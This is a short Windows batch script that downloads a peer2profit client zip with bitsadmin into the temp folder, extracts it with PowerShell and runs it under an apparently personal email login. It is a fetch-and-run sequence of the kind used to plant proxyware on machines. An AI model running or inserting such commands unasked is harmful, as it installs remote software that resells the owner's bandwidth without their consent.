bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://updates.peer2profit.com/p2pclient_v0.55_signed.zip" "%temp%\p2pclient.zip"
cd %temp%
powershell -Command "Expand-Archive p2pclient.zip -DestinationPath %temp%" 
cd %temp%
p2pclient.exe -l jrpe9211@gmail.com